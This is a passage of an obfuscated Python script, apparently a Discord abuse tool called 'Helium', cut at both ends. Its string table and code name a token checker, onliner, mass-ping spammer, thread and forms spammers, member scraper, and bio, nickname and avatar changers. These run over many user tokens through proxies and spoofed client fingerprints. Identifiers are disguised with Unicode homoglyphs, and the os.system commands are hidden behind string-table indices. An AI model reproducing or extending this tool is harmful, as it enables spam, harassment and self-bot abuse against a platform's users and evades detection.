'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDE3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InBsIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMTcgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMTIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMTIiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyMjYyMjAsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM2NDQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==', 'https://canary.discordapp.com/api/v9/users/@me/library', 'http', 'https', 'http://', '.', 'Valid', '**', 'Locked', 'Invalid', 'wss://gateway.discord.gg/?v=9&encoding=json', 'token', 'properties', '$os', '$browser', '$device', 'windows', 'Discord', 'desktop', 'channel_id', 'self_mute', 'self_deaf', 'Joined', 'content', 'https://discord.com/api/v9/channels/', '/messages', 'Sent', 'Fail', '** ', 'online', 'idle', 'dnd', 'wss://gateway.discord.gg/?v=6&encording=json', 'capabilities', 'presence', 'compress', 'client_state', 'device', 'referrer', 'referring_domain', 'referrer_current', 'referring_domain_current', 'Chrome', 'en-GB', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36', '90.0.4430.212', '10', '85108', 'null', 'status', 'since', 'activities', 'afk', 'guild_hashes', 'highest_last_message_id', 'read_state_version', 'user_guild_settings_version', 'bio', 'https://discord.com/api/v9/users/@me/profile', 'Success', 'Failure', 'nick', '/members/@me', 'type', 'auto_archive_duration', 'location', 'Thread Browser Toolbar', '/threads', 'applied_tags', '/threads?use_nested_fields=true', '/member-verification?with_guild=false', '/requests/@me', 'Failed', '/', '/messages/', '/reactions/', '/@me?location=Message', 'Reacted', 'avatars/', 'rb+', 'avatar', 'data:image/png;base64,', 'utf-8', 'https://discord.com/api/v9/users/@me', 'limit', 'around', '50', 'components', 'nonce', 'message_flags', 'message_id', 'application_id', 'author', 'component_type', 'custom_id', 'https://discord.com/api/v9/interactions', '1', '2', '3', '4', '5', '6', '7', '8', '9', '11', '12', '13', '14', '15', '16', '20', '    ', '>', '\nPress any key to go back to the main menu...', 'pause > nul', 'title Helium - avatar changer', 'title Helium - formater', ':', '+', '] Formatted ', ' tokens', 'Message Link', '] → ', "If there's 1 button, type: (", '), if you want to click second button just type 1 or more.', 'Button Option', "If there's 1 reaction, type: (", '), if reaction is the second reaction just type 1 or more.', 'Reaction', 'title Helium - Forms Spammer', 'Channel ID', 'Thread Name', 'Message', 'title Helium - Thread spammer', 'Thread name', 'title Helium - Nickname Changer', 'Guild ID', 'Nick', 'title Helium - Check Guild', 'INVITE: ', 'Joining Delay', 'https://', 'title Helium - Accept rules', 'Server ID: ', 'title Helium - VC Joiner', 'title Helium - Bio Changer', 'Bio', 'GUILD ID', 'title Helium - Token Checker', 'title Helium - Onliner', 'Onliner', '] All tokens are online', 'title Helium - Spammer', 'Mass-Ping?', ' → ', '→ ', 'Delay', 'y', 'Pings Count', 'Scraping Members', '(it might take a while)', 'n', 'title Helium - exit', '__main__']
import os
𝘰𝘀.system(𝘐𝘕𝙄𝗡𝙡𝘭𝙄𝙈𝘐𝙄𝙡𝘔𝘭𝙡𝗜𝘭𝙡𝙉𝙉𝗜𝘭𝗹𝗠𝙉𝗹𝙉𝗹𝗠𝘐𝘔𝙄𝘔[0])
𝙤𝘀.system(𝗜𝘕𝙄𝙉𝘭𝙡𝙄𝘔𝙄𝗜𝗹𝗠𝙡𝘭𝙄𝘭𝗹𝘕𝘕𝗜𝘭𝙡𝗠𝗡𝙡𝘕𝘭𝙈𝙄𝘔𝙄𝙈[1])
try:
    from colorama import Fore
    from os.path import isfile, join
    from pathlib import Path
    from threading import Thread
    from time import sleep
    from tls_client import Session
    from websocket import WebSocket
    import base64
    import colorama
    import datetime
    import hashlib
    import json
    import numpy as np
    import random
    import requests
    import subprocess
    import sys
    import threading
    import time
    import tls_client
    import uuid
    import websocket
    import emoji as ej
except 𝙈𝙤𝙙𝘂𝙡𝙚𝗡𝘰𝘵𝗙𝙤𝙪𝗻𝙙𝙀𝗿𝘳𝗼𝘳:
    𝗼𝙨.system(𝙄𝙉𝗜𝙉𝙡𝙡𝗜𝗠𝗜𝗜𝗹𝗠𝗹𝙡𝙄𝙡𝘭𝘕𝙉𝙄𝘭𝗹𝗠𝘕𝙡𝗡𝘭𝘔𝙄𝗠𝙄𝙈[2])
    𝙤𝘴.system(𝗜𝘕𝙄𝗡𝙡𝗹𝘐𝘔𝗜𝙄𝘭𝙈𝘭𝗹𝗜𝗹𝗹𝙉𝙉𝘐𝗹𝗹𝘔𝙉𝗹𝘕𝗹𝙈𝙄𝙈𝙄𝙈[3])
    𝘰𝙨.system(𝗜𝙉𝙄𝘕𝙡𝗹𝘐𝗠𝙄𝘐𝘭𝙈𝘭𝗹𝙄𝗹𝗹𝘕𝙉𝗜𝘭𝘭𝘔𝙉𝗹𝗡𝗹𝗠𝙄𝘔𝗜𝗠[4])
    𝙤𝘀.system(𝘐𝙉𝘐𝘕𝘭𝘭𝙄𝙈𝘐𝘐𝗹𝗠𝘭𝘭𝘐𝗹𝘭𝘕𝗡𝘐𝘭𝗹𝗠𝗡𝙡𝗡𝙡𝙈𝘐𝘔𝗜𝙈[5])
    𝘰𝘴.system(𝘐𝙉𝗜𝗡𝙡𝗹𝘐𝗠𝗜𝘐𝗹𝗠𝗹𝗹𝙄𝗹𝘭𝘕𝙉𝙄𝗹𝗹𝙈𝘕𝗹𝙉𝘭𝘔𝙄𝙈𝘐𝘔[6])
    𝗼𝙨.system(𝗜𝘕𝘐𝘕𝘭𝙡𝙄𝘔𝘐𝘐𝙡𝗠𝙡𝙡𝙄𝗹𝙡𝗡𝙉𝘐𝗹𝙡𝙈𝙉𝙡𝘕𝗹𝙈𝘐𝗠𝙄𝙈[7])
    𝗼𝙨.system(𝘐𝘕𝗜𝗡𝙡𝗹𝘐𝘔𝗜𝘐𝙡𝙈𝘭𝘭𝗜𝗹𝘭𝘕𝘕𝗜𝙡𝘭𝘔𝙉𝗹𝗡𝘭𝙈𝙄𝙈𝗜𝗠[8])
    𝙤𝙨.system(𝗜𝗡𝙄𝗡𝗹𝘭𝙄𝗠𝗜𝙄𝗹𝘔𝙡𝘭𝘐𝙡𝘭𝙉𝗡𝗜𝘭𝙡𝘔𝗡𝙡𝘕𝙡𝙈𝘐𝙈𝘐𝙈[9])
    𝘰𝘀.system(𝘐𝗡𝘐𝘕𝘭𝘭𝗜𝙈𝙄𝘐𝗹𝘔𝘭𝙡𝘐𝗹𝘭𝘕𝙉𝗜𝗹𝙡𝘔𝘕𝙡𝙉𝘭𝗠𝗜𝙈𝘐𝗠[10])
    𝗼𝘀.system(𝗜𝗡𝙄𝘕𝙡𝘭𝘐𝗠𝙄𝘐𝗹𝘔𝘭𝙡𝗜𝙡𝘭𝗡𝘕𝙄𝗹𝙡𝙈𝗡𝗹𝙉𝙡𝗠𝗜𝗠𝙄𝘔[11])
    𝗼𝘀.system(𝙄𝙉𝗜𝗡𝙡𝙡𝘐𝙈𝘐𝙄𝙡𝗠𝗹𝘭𝘐𝘭𝘭𝙉𝘕𝙄𝗹𝗹𝙈𝗡𝘭𝙉𝙡𝙈𝙄𝙈𝙄𝘔[12])
    𝗼𝘀.system(𝙄𝙉𝙄𝙉𝗹𝙡𝘐𝘔𝘐𝘐𝘭𝗠𝘭𝙡𝘐𝘭𝘭𝘕𝗡𝙄𝙡𝙡𝗠𝘕𝘭𝗡𝗹𝘔𝗜𝙈𝗜𝗠[13])
    𝘰𝘴.system(𝗜𝘕𝙄𝗡𝘭𝘭𝘐𝘔𝗜𝘐𝙡𝘔𝘭𝙡𝙄𝗹𝘭𝗡𝙉𝘐𝙡𝗹𝗠𝙉𝙡𝙉𝙡𝘔𝙄𝘔𝗜𝘔[14])
    𝘰𝙨.system(𝘐𝘕𝗜𝗡𝘭𝘭𝘐𝙈𝘐𝘐𝗹𝘔𝙡𝙡𝘐𝗹𝙡𝗡𝘕𝙄𝘭𝙡𝗠𝘕𝘭𝗡𝘭𝗠𝙄𝗠𝗜𝙈[15])
    𝙤𝘴.system(𝘐𝘕𝘐𝗡𝗹𝙡𝙄𝘔𝙄𝗜𝗹𝘔𝘭𝙡𝙄𝗹𝗹𝘕𝗡𝙄𝗹𝘭𝙈𝙉𝗹𝗡𝘭𝘔𝙄𝙈𝘐𝘔[16])
    from colorama import Fore
    from os.path import isfile, join
    from pathlib import Path
    from threading import Thread
    from time import sleep
    from tls_client import Session
    from websocket import WebSocket
    import base64
    import colorama
    import datetime
    import hashlib
    import json
    import numpy as np
    import random
    import requests
    import subprocess
    import sys
    import threading
    import time
    import tls_client
    import uuid
    import websocket
    import emoji as ej
𝘤𝗼𝘭𝗼𝘳𝘢𝗺𝗮.init()
𝘀𝘥𝘪𝘳 = 𝙤𝙨.path.dirname(𝙤𝙨.path.abspath(__𝗳𝙞𝘭𝙚__))
𝙙𝗮𝘵𝗮 = 𝗼𝘴.path.join(𝘀𝙙𝘪𝙧, 𝘐𝗡𝘐𝗡𝗹𝘭𝗜𝙈𝙄𝙄𝙡𝗠𝙡𝘭𝘐𝗹𝘭𝙉𝗡𝙄𝙡𝗹𝙈𝘕𝙡𝗡𝘭𝙈𝘐𝗠𝙄𝘔[17])
𝗮𝘣𝗰 = 𝘰𝘴.path.dirname(𝙤𝘴.path.abspath(𝘥𝗮𝘵𝗮))
𝗮𝙫𝙖𝘁𝘢𝘳𝙨 = 𝘰𝘀.path.join(𝙖𝗯𝘤, 𝘐𝘕𝙄𝗡𝘭𝙡𝘐𝗠𝘐𝙄𝙡𝙈𝘭𝙡𝙄𝙡𝘭𝙉𝗡𝘐𝘭𝙡𝙈𝗡𝙡𝗡𝙡𝙈𝘐𝘔𝗜𝘔[18])
if not 𝘰𝘀.path.exists(𝙙𝗮𝙩𝗮):
    𝘰𝘀.system(𝙄𝙉𝗜𝗡𝙡𝘭𝙄𝘔𝗜𝗜𝗹𝘔𝘭𝗹𝗜𝘭𝘭𝙉𝗡𝗜𝘭𝘭𝗠𝙉𝘭𝘕𝘭𝗠𝘐𝙈𝗜𝗠[19])
    𝗼𝘴.makedirs(𝗱𝘢𝘵𝗮)
    𝙤𝙨.makedirs(𝙖𝘃𝗮𝘵𝗮𝙧𝘀)
    with 𝗼𝘱𝗲𝙣(𝗼𝘴.path.join(𝙙𝙖𝘵𝘢, 𝙄𝙉𝗜𝘕𝙡𝙡𝘐𝗠𝘐𝙄𝗹𝗠𝙡𝗹𝘐𝗹𝙡𝙉𝘕𝘐𝙡𝗹𝗠𝙉𝙡𝘕𝙡𝙈𝙄𝙈𝘐𝙈[20]), 𝘐𝙉𝙄𝙉𝙡𝗹𝘐𝙈𝙄𝘐𝘭𝙈𝙡𝙡𝙄𝙡𝗹𝙉𝘕𝘐𝗹𝘭𝘔𝗡𝗹𝘕𝙡𝘔𝘐𝙈𝗜𝘔[21]) as 𝘧:
        𝘧.write(𝗜𝙉𝙄𝙉𝙡𝙡𝘐𝘔𝗜𝗜𝘭𝘔𝘭𝙡𝙄𝙡𝘭𝗡𝘕𝙄𝘭𝘭𝘔𝙉𝙡𝘕𝗹𝗠𝘐𝗠𝗜𝙈[22])
    with 𝗼𝙥𝘦𝘯(𝘰𝘴.path.join(𝗱𝘢𝘁𝘢, 𝗜𝙉𝙄𝘕𝗹𝙡𝙄𝗠𝗜𝗜𝘭𝙈𝙡𝙡𝗜𝗹𝘭𝙉𝘕𝙄𝘭𝙡𝗠𝘕𝙡𝘕𝙡𝘔𝗜𝘔𝙄𝗠[23]), 𝗜𝘕𝗜𝙉𝗹𝗹𝗜𝗠𝘐𝘐𝙡𝙈𝗹𝘭𝙄𝘭𝗹𝙉𝘕𝘐𝙡𝙡𝗠𝗡𝘭𝘕𝘭𝗠𝘐𝙈𝗜𝗠[21]) as 𝙛:
        𝗳.write(𝙄𝘕𝘐𝙉𝗹𝙡𝙄𝗠𝘐𝗜𝘭𝘔𝙡𝗹𝘐𝙡𝘭𝘕𝗡𝗜𝘭𝗹𝘔𝗡𝘭𝙉𝗹𝙈𝘐𝘔𝙄𝗠[22])
    with 𝙤𝙥𝙚𝗻(𝗼𝙨.path.join(𝗱𝙖𝘵𝙖, 𝙄𝙉𝘐𝘕𝘭𝗹𝗜𝗠𝗜𝗜𝗹𝗠𝗹𝘭𝙄𝗹𝙡𝘕𝗡𝙄𝗹𝗹𝙈𝘕𝘭𝙉𝗹𝘔𝘐𝙈𝗜𝙈[24]), 𝗜𝗡𝘐𝗡𝙡𝘭𝙄𝘔𝗜𝗜𝘭𝘔𝗹𝗹𝗜𝗹𝘭𝙉𝘕𝘐𝙡𝘭𝗠𝗡𝗹𝗡𝗹𝘔𝘐𝙈𝗜𝙈[21]) as 𝗳:
        𝙛.write(𝘐𝘕𝗜𝙉𝙡𝘭𝙄𝗠𝙄𝙄𝗹𝗠𝗹𝗹𝙄𝙡𝙡𝗡𝗡𝘐𝘭𝘭𝗠𝗡𝙡𝘕𝗹𝘔𝘐𝙈𝗜𝘔[22])
𝙘𝙤𝘯𝗳𝗶𝙜𝙥 = 𝘰𝙨.path.join(𝘀𝘥𝘪𝘳, 𝘐𝘕𝗜𝘕𝙡𝗹𝙄𝘔𝗜𝗜𝙡𝙈𝗹𝘭𝘐𝙡𝗹𝘕𝗡𝙄𝘭𝗹𝗠𝙉𝗹𝙉𝗹𝘔𝙄𝘔𝘐𝘔[25])
if not 𝙤𝘀.path.exists(𝘤𝗼𝗻𝗳𝗶𝗴𝗽):
    with 𝘰𝗽𝙚𝗻(𝙤𝘴.path.join(𝘐𝗡𝗜𝘕𝗹𝗹𝗜𝗠𝘐𝘐𝗹𝙈𝙡𝗹𝗜𝙡𝙡𝗡𝙉𝗜𝗹𝗹𝗠𝘕𝘭𝗡𝗹𝙈𝙄𝗠𝘐𝘔[25]), 𝗜𝘕𝙄𝙉𝗹𝙡𝘐𝙈𝗜𝗜𝘭𝗠𝘭𝗹𝙄𝗹𝗹𝘕𝙉𝗜𝙡𝘭𝙈𝘕𝙡𝙉𝙡𝗠𝗜𝗠𝙄𝘔[21]) as 𝘧:
        𝙛.write(𝘐𝘕𝙄𝗡𝙡𝘭𝙄𝙈𝗜𝙄𝘭𝘔𝘭𝘭𝗜𝘭𝗹𝙉𝘕𝗜𝙡𝗹𝘔𝘕𝗹𝙉𝙡𝙈𝙄𝙈𝘐𝘔[26])
with 𝘰𝙥𝘦𝙣(𝘐𝙉𝙄𝗡𝙡𝙡𝗜𝗠𝘐𝘐𝘭𝘔𝙡𝘭𝘐𝘭𝗹𝗡𝙉𝗜𝙡𝘭𝘔𝗡𝗹𝘕𝗹𝘔𝗜𝙈𝗜𝗠[25], encoding=𝗜𝗡𝙄𝙉𝘭𝗹𝙄𝘔𝙄𝙄𝘭𝘔𝘭𝘭𝗜𝗹𝙡𝗡𝗡𝘐𝙡𝘭𝙈𝘕𝘭𝗡𝗹𝘔𝘐𝗠𝙄𝙈[27]) as 𝘧:
    𝗻𝘪𝙜 = 𝗷𝘴𝙤𝗻.load(𝙛)
𝘱𝘳𝗼𝘅𝙮 = 𝙣𝘪𝙜.get(𝘐𝘕𝙄𝗡𝘭𝗹𝗜𝘔𝗜𝙄𝗹𝘔𝘭𝗹𝘐𝗹𝙡𝙉𝘕𝗜𝙡𝙡𝙈𝘕𝘭𝘕𝙡𝗠𝗜𝘔𝗜𝙈[28])
𝘱𝘳𝙤𝘅𝗶𝙚𝙨 = 𝗼𝗽𝙚𝘯(𝘐𝙉𝘐𝘕𝗹𝗹𝘐𝘔𝘐𝘐𝘭𝗠𝙡𝗹𝘐𝘭𝗹𝙉𝗡𝗜𝘭𝗹𝙈𝗡𝙡𝘕𝗹𝗠𝙄𝗠𝘐𝙈[29], 𝘐𝙉𝙄𝙉𝘭𝘭𝗜𝙈𝙄𝗜𝙡𝗠𝙡𝗹𝗜𝘭𝙡𝗡𝙉𝘐𝘭𝗹𝙈𝙉𝙡𝘕𝙡𝘔𝘐𝘔𝗜𝘔[30], encoding=𝗜𝗡𝘐𝙉𝘭𝗹𝗜𝙈𝘐𝗜𝙡𝘔𝗹𝙡𝙄𝙡𝘭𝙉𝘕𝗜𝘭𝘭𝘔𝗡𝙡𝙉𝙡𝘔𝘐𝘔𝘐𝗠[27]).read().splitlines()
𝘣 = 𝗙𝙤𝗿𝘦.LIGHTBLUE_EX
𝗿 = 𝙁𝙤𝗿𝘦.RESET
𝘨 = 𝙁𝘰𝗿𝘦.LIGHTBLACK_EX
𝙖 = 𝙁𝗼𝘳𝗲.BLUE
𝙘 = 𝗙𝗼𝘳𝙚.CYAN
𝙡𝙘 = 𝘍𝘰𝗿𝗲.LIGHTCYAN_EX
𝗿𝗲𝙙 = 𝙁𝘰𝙧𝙚.RED
𝘺𝗲𝘭𝙡𝙤𝘸 = 𝙁𝙤𝙧𝗲.YELLOW
𝙜𝗿𝗲𝘦𝘯 = 𝗙𝘰𝘳𝘦.GREEN
𝗯𝙡𝙪𝘦 = 𝗙𝘰𝗿𝗲.BLUE
𝙤𝙧𝙖𝘯𝗴𝗲 = 𝙁𝘰𝗿𝗲.RED + 𝘍𝘰𝙧𝙚.YELLOW
𝗽𝙧𝘦𝘵𝘵𝘆 = 𝙁𝘰𝙧𝗲.LIGHTMAGENTA_EX + 𝘍𝗼𝘳𝙚.LIGHTCYAN_EX
𝗺𝗮𝙜𝙚𝙣𝘵𝘢 = 𝙁𝗼𝗿𝗲.MAGENTA
𝘭𝙞𝙜𝙝𝘁𝙗𝗹𝙪𝙚 = 𝘍𝙤𝘳𝗲.LIGHTBLUE_EX
𝘤𝙮𝗮𝗻 = 𝗙𝘰𝙧𝗲.CYAN
𝗴𝙧𝘢𝘺 = 𝗙𝗼𝗿𝘦.LIGHTBLACK_EX + 𝙁𝗼𝙧𝙚.WHITE
𝘳𝙚𝙨𝗲𝙩 = 𝗙𝘰𝘳𝘦.RESET
𝙥𝙞𝗻𝙠 = 𝗙𝗼𝙧𝗲.LIGHTGREEN_EX + 𝘍𝗼𝘳𝗲.LIGHTMAGENTA_EX
𝘀𝙚𝘀𝙨𝗶𝘰𝘯 = 𝘁𝗹𝘀_𝙘𝗹𝙞𝘦𝘯𝘵.Session(𝙄𝗡𝗜𝗡𝙡𝘭𝗜𝘔𝙄𝘐𝗹𝘔𝘭𝙡𝗜𝗹𝙡𝙉𝙉𝗜𝗹𝘭𝗠𝘕𝘭𝗡𝗹𝘔𝙄𝗠𝗜𝗠[31])
𝗺𝙚𝗻𝙪 = f'{𝘳}{𝗜𝙉𝗜𝙉𝗹𝘭𝘐𝗠𝗜𝘐𝙡𝗠𝗹𝗹𝙄𝙡𝗹𝘕𝘕𝘐𝗹𝗹𝘔𝘕𝘭𝘕𝗹𝙈𝙄𝘔𝗜𝙈[32]}{𝙡𝘤}{𝗜𝗡𝙄𝘕𝘭𝗹𝙄𝙈𝙄𝗜𝘭𝙈𝗹𝗹𝙄𝗹𝗹𝙉𝙉𝗜𝗹𝘭𝗠𝗡𝘭𝗡𝙡𝘔𝘐𝘔𝙄𝗠[33]}{𝘳}{𝘐𝘕𝙄𝙉𝘭𝗹𝗜𝘔𝘐𝘐𝗹𝗠𝘭𝗹𝘐𝗹𝘭𝙉𝗡𝙄𝙡𝘭𝗠𝙉𝘭𝘕𝗹𝙈𝙄𝗠𝘐𝗠[34]}{𝘭𝗰}{𝗜𝙉𝗜𝘕𝙡𝗹𝙄𝙈𝙄𝗜𝘭𝙈𝙡𝙡𝘐𝗹𝘭𝗡𝗡𝗜𝗹𝗹𝙈𝙉𝘭𝗡𝗹𝗠𝗜𝙈𝘐𝙈[35]}{𝘳}{𝗜𝙉𝘐𝗡𝘭𝙡𝘐𝘔𝙄𝗜𝘭𝗠𝙡𝗹𝘐𝙡𝘭𝗡𝙉𝘐𝘭𝙡𝗠𝙉𝘭𝗡𝙡𝙈𝘐𝗠𝗜𝙈[36]}{𝘭𝘤}{𝘐𝗡𝗜𝘕𝘭𝘭𝗜𝗠𝘐𝘐𝘭𝘔𝘭𝙡𝘐𝙡𝙡𝗡𝗡𝙄𝗹𝙡𝙈𝗡𝙡𝗡𝘭𝗠𝗜𝘔𝙄𝗠[35]}{𝙧}{𝘐𝙉𝗜𝘕𝗹𝗹𝘐𝘔𝘐𝙄𝗹𝘔𝙡𝘭𝗜𝗹𝘭𝙉𝙉𝗜𝗹𝘭𝗠𝘕𝘭𝙉𝙡𝘔𝘐𝗠𝙄𝘔[34]}{𝘭𝗰}{𝘐𝙉𝘐𝗡𝗹𝗹𝘐𝙈𝗜𝘐𝘭𝙈𝘭𝘭𝗜𝙡𝙡𝘕𝗡𝘐𝘭𝙡𝗠𝗡𝗹𝙉𝗹𝗠𝗜𝗠𝙄𝙈[37]}{𝙧}{𝙄𝗡𝙄𝘕𝙡𝘭𝗜𝘔𝙄𝗜𝙡𝙈𝗹𝘭𝙄𝗹𝗹𝘕𝗡𝗜𝘭𝘭𝘔𝘕𝙡𝘕𝘭𝗠𝗜𝙈𝘐𝙈[34]}{𝘭𝘤}{𝙄𝘕𝘐𝘕𝘭𝙡𝘐𝗠𝗜𝗜𝘭𝘔𝙡𝙡𝘐𝙡𝙡𝘕𝗡𝘐𝘭𝙡𝙈𝗡𝗹𝘕𝗹𝙈𝗜𝗠𝙄𝘔[35]}{𝙧}{𝗜𝗡𝗜𝙉𝘭𝙡𝘐𝙈𝙄𝗜𝙡𝘔𝗹𝘭𝗜𝙡𝗹𝗡𝘕𝘐𝗹𝗹𝙈𝗡𝘭𝗡𝗹𝘔𝙄𝗠𝙄𝙈[34]}{𝘭𝘤}{𝗜𝙉𝙄𝙉𝗹𝗹𝘐𝙈𝙄𝘐𝙡𝗠𝗹𝗹𝗜𝗹𝘭𝗡𝘕𝗜𝘭𝙡𝙈𝗡𝙡𝙉𝗹𝙈𝗜𝗠𝙄𝘔[38]}{𝘳}{𝘐𝙉𝗜𝗡𝗹𝗹𝙄𝗠𝘐𝗜𝘭𝗠𝘭𝗹𝗜𝗹𝗹𝘕𝙉𝙄𝙡𝙡𝙈𝘕𝘭𝗡𝗹𝗠𝗜𝘔𝙄𝘔[34]}{𝘭𝙘}{𝗜𝗡𝘐𝘕𝗹𝙡𝘐𝘔𝘐𝘐𝗹𝗠𝙡𝗹𝘐𝙡𝘭𝙉𝘕𝗜𝘭𝘭𝗠𝗡𝗹𝙉𝙡𝗠𝗜𝗠𝘐𝘔[35]}{𝘳}{𝙄𝗡𝘐𝗡𝗹𝗹𝗜𝘔𝘐𝙄𝘭𝙈𝘭𝗹𝙄𝘭𝘭𝘕𝙉𝗜𝗹𝘭𝗠𝙉𝙡𝗡𝙡𝗠𝗜𝘔𝗜𝗠[39]}{𝗹𝙘}{𝗜𝗡𝗜𝙉𝘭𝘭𝙄𝗠𝙄𝗜𝗹𝙈𝘭𝙡𝘐𝘭𝙡𝗡𝘕𝗜𝙡𝙡𝘔𝘕𝙡𝗡𝘭𝙈𝘐𝙈𝗜𝘔[38]}{𝗿}{𝗜𝙉𝘐𝙉𝙡𝘭𝗜𝘔𝘐𝘐𝗹𝗠𝗹𝗹𝙄𝘭𝗹𝙉𝗡𝗜𝙡𝗹𝘔𝘕𝗹𝙉𝗹𝗠𝗜𝙈𝙄𝙈[39]}{𝘭𝗰}{𝗜𝙉𝙄𝘕𝙡𝘭𝘐𝙈𝙄𝙄𝗹𝙈𝗹𝘭𝗜𝘭𝙡𝙉𝗡𝙄𝗹𝗹𝘔𝘕𝙡𝙉𝗹𝗠𝘐𝙈𝗜𝘔[40]}{𝙧}{𝙄𝗡𝙄𝗡𝙡𝘭𝙄𝘔𝙄𝗜𝙡𝘔𝙡𝗹𝙄𝗹𝙡𝙉𝘕𝘐𝗹𝗹𝘔𝘕𝙡𝗡𝗹𝗠𝘐𝗠𝘐𝗠[34]}{𝗹𝘤}{𝙄𝙉𝙄𝘕𝙡𝗹𝙄𝙈𝙄𝙄𝘭𝗠𝘭𝘭𝘐𝘭𝙡𝘕𝗡𝙄𝙡𝙡𝘔𝙉𝘭𝘕𝘭𝗠𝘐𝙈𝙄𝘔[41]}{𝘳}{𝗜𝙉𝗜𝘕𝗹𝘭𝘐𝙈𝗜𝘐𝗹𝙈𝙡𝗹𝙄𝙡𝗹𝗡𝗡𝗜𝗹𝘭𝘔𝗡𝙡𝗡𝙡𝗠𝗜𝗠𝗜𝘔[34]}{𝘭𝘤}{𝙄𝙉𝘐𝗡𝙡𝗹𝗜𝘔𝗜𝘐𝙡𝗠𝗹𝙡𝗜𝘭𝘭𝗡𝗡𝗜𝙡𝗹𝗠𝗡𝘭𝘕𝙡𝗠𝙄𝗠𝗜𝘔[42]}{𝘳}{𝘐𝗡𝙄𝘕𝘭𝘭𝗜𝗠𝘐𝘐𝘭𝘔𝘭𝗹𝗜𝘭𝙡𝘕𝙉𝘐𝙡𝙡𝘔𝙉𝘭𝘕𝙡𝘔𝘐𝗠𝗜𝗠[34]}{𝙡𝙘}{𝙄𝙉𝘐𝗡𝘭𝙡𝗜𝙈𝘐𝗜𝙡𝘔𝘭𝙡𝙄𝘭𝗹𝙉𝙉𝘐𝘭𝘭𝙈𝙉𝗹𝗡𝙡𝘔𝘐𝘔𝘐𝗠[43]}{𝗿}{𝘐𝗡𝗜𝗡𝗹𝗹𝗜𝗠𝗜𝗜𝘭𝙈𝙡𝗹𝘐𝘭𝗹𝙉𝙉𝘐𝘭𝙡𝗠𝗡𝗹𝙉𝙡𝘔𝙄𝙈𝙄𝘔[34]}{𝙡𝘤}{𝙄𝙉𝗜𝘕𝗹𝙡𝙄𝘔𝗜𝗜𝙡𝗠𝙡𝘭𝗜𝗹𝗹𝘕𝙉𝙄𝘭𝘭𝙈𝘕𝗹𝗡𝙡𝙈𝘐𝘔𝘐𝘔[44]}{𝗿}{𝙄𝙉𝗜𝗡𝘭𝙡𝗜𝘔𝘐𝗜𝘭𝙈𝘭𝗹𝗜𝙡𝗹𝗡𝗡𝘐𝗹𝗹𝘔𝘕𝗹𝙉𝘭𝘔𝘐𝗠𝙄𝗠[34]}{𝗹𝙘}{𝙄𝘕𝗜𝗡𝗹𝘭𝘐𝙈𝗜𝘐𝗹𝘔𝙡𝘭𝘐𝙡𝗹𝘕𝙉𝗜𝗹𝘭𝙈𝘕𝙡𝗡𝘭𝗠𝙄𝘔𝗜𝗠[42]}{𝗿}{𝘐𝙉𝘐𝘕𝘭𝗹𝘐𝗠𝗜𝗜𝘭𝙈𝘭𝘭𝗜𝗹𝗹𝗡𝘕𝗜𝘭𝘭𝙈𝘕𝗹𝙉𝙡𝗠𝙄𝗠𝙄𝙈[34]}{𝘭𝙘}{𝗜𝗡𝗜𝘕𝗹𝙡𝙄𝘔𝗜𝘐𝘭𝗠𝘭𝘭𝗜𝗹𝘭𝗡𝗡𝙄𝗹𝗹𝗠𝘕𝗹𝗡𝘭𝗠𝗜𝘔𝗜𝗠[45]}{𝙧}{𝗜𝗡𝙄𝗡𝙡𝙡𝗜𝙈𝗜𝙄𝗹𝙈𝘭𝙡𝘐𝘭𝗹𝗡𝗡𝙄𝘭𝗹𝙈𝗡𝙡𝙉𝗹𝘔𝙄𝗠𝘐𝙈[34]}{𝗹𝙘}{𝗜𝘕𝙄𝗡𝘭𝗹𝙄𝘔𝗜𝘐𝘭𝗠𝗹𝗹𝗜𝙡𝙡𝗡𝗡𝘐𝙡𝗹𝗠𝗡𝙡𝙉𝘭𝙈𝗜𝙈𝗜𝘔[42]}{𝙧}{𝘐𝗡𝗜𝘕𝙡𝘭𝙄𝗠𝗜𝘐𝙡𝙈𝗹𝗹𝘐𝙡𝗹𝘕𝘕𝗜𝙡𝙡𝗠𝘕𝗹𝙉𝘭𝙈𝘐𝘔𝘐𝙈[46]}{𝙡𝘤}{𝙄𝘕𝙄𝘕𝗹𝙡𝙄𝗠𝗜𝘐𝗹𝗠𝗹𝘭𝗜𝗹𝙡𝗡𝙉𝙄𝗹𝗹𝘔𝘕𝗹𝗡𝘭𝗠𝗜𝘔𝗜𝗠[47]}{𝗿}{𝙄𝙉𝘐𝗡𝙡𝗹𝘐𝗠𝗜𝙄𝘭𝙈𝙡𝙡𝘐𝘭𝙡𝗡𝗡𝙄𝙡𝘭𝙈𝘕𝘭𝘕𝙡𝗠𝗜𝙈𝘐𝘔[46]}{𝗹𝙘}{𝗜𝗡𝙄𝗡𝗹𝗹𝘐𝘔𝘐𝗜𝙡𝗠𝗹𝙡𝙄𝙡𝙡𝗡𝗡𝘐𝘭𝙡𝘔𝙉𝗹𝙉𝗹𝙈𝘐𝗠𝘐𝘔[42]}{𝙧}{𝙄𝗡𝗜𝘕𝗹𝙡𝙄𝘔𝘐𝙄𝘭𝗠𝙡𝘭𝙄𝘭𝙡𝙉𝙉𝙄𝙡𝗹𝘔𝙉𝗹𝗡𝗹𝘔𝘐𝙈𝙄𝘔[48]}{𝗹𝙘}{𝙄𝘕𝙄𝘕𝘭𝙡𝘐𝗠𝘐𝗜𝗹𝘔𝙡𝗹𝘐𝙡𝘭𝘕𝗡